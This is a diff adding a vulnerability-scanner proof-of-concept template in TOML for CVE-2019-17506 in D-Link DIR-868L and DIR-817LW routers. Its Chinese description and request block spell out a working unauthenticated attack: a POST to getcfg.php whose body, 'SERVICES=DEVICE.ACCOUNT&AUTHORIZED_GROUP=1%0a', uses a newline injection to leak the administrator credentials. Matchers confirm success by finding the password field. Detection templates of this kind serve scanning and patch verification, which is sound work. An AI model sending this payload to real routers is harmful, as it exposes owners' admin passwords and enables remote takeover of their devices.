@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "D-Link DIR-868L B1-2.03 和 DIR-817LW A1-1.04 路由器存在未授权信息泄露漏洞，攻击者可通过向 getcfg.php 发送特制 POST 请求，利用 SERVICES 参数配合 DEVICE.ACCOUNT 值及 AUTHORIZED_GROUP=1%0a 注入换行符绕过认证机制，直接获取路由器管理员账号、密码及其他敏感配置信息，进而远程控制受影响设备。"
+id = "POC-AVE-2019-0125"
+name = "D-Link DIR-868L/DIR-817LW 信息泄露漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0125"]
+vuln_id = [
+    "CVE-2019-17506",
+    "AVE-2019-0125",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/getcfg.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "</password>",
+    "DEVICE.ACCOUNT",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
